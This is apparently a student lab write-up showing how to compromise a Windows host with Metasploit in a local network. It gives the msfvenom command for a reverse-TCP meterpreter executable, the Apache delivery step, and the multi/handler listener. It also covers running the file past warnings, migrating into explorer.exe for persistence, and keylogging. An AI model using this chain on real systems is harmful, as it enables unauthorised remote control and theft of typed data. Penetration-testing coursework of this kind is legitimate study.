# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT:
![Screenshot 2024-10-09 082740](https://github.com/user-attachments/assets/81af2218-803e-47da-9669-4e2aec5cdd2f)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![Screenshot 2024-10-09 082751](https://github.com/user-attachments/assets/383824da-ba51-4cdf-8eb4-465f27d8c497)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![Screenshot 2024-10-09 082806](https://github.com/user-attachments/assets/29e47a0d-a590-4835-8386-a24e243b9f9e)


Start apache server
sudo systemctl apache2 start
## OUTPUT:
![Screenshot 2024-10-09 082817](https://github.com/user-attachments/assets/d47682b3-0a5a-42e8-8c3d-2a24655d24a5)

Check the status of apache2
## OUTPUT:
![Screenshot 2024-10-09 082834](https://github.com/user-attachments/assets/545a3b41-410d-481e-ba6a-0215594f1a8e)

Invoke msfconsole:
## OUTPUT:
![Screenshot 2024-10-09 082849](https://github.com/user-attachments/assets/4c8b88db-e116-4022-9fdb-f4ae29353850)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![Screenshot 2024-10-09 082914](https://github.com/user-attachments/assets/4622b76d-8df9-45f6-a299-81e4fa841f89)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![Screenshot 2024-10-09 082927](https://github.com/user-attachments/assets/37229e74-48c4-438f-b719-8eaeb3442bb1)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![Screenshot 2024-10-09 082936](https://github.com/user-attachments/assets/6c2f5125-3af1-4220-9d09-3de65ce1c6f1)

Bypass any warning boxes, double-click the file, and allow it to run.

![Screenshot 2024-10-09 082947](https://github.com/user-attachments/assets/30514d6a-414c-4acc-8545-6bda15593bad)

On kali give the command exploit

![Screenshot 2024-10-09 082956](https://github.com/user-attachments/assets/ad2511f0-706e-42c8-bc08-8527e5b31cd5)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![Screenshot 2024-10-09 083005](https://github.com/user-attachments/assets/4e3006f1-0245-4480-9130-fa6ff1f5176c)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:
migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![Screenshot 2024-10-09 083017](https://github.com/user-attachments/assets/15693580-f55a-4729-89ea-b4a8245ad8fd)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2024-10-09 083042](https://github.com/user-attachments/assets/d3955e35-d9f8-4319-8e23-910884f3bf40)

![Screenshot 2024-10-09 083053](https://github.com/user-attachments/assets/a091a620-6605-4976-b330-edd98659798f)


keyscan_dump	Shows the keystrokes captured so far

![Screenshot 2024-10-09 083101](https://github.com/user-attachments/assets/e8496e1e-b936-41a6-b8d5-fcd5e86e8dd6)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
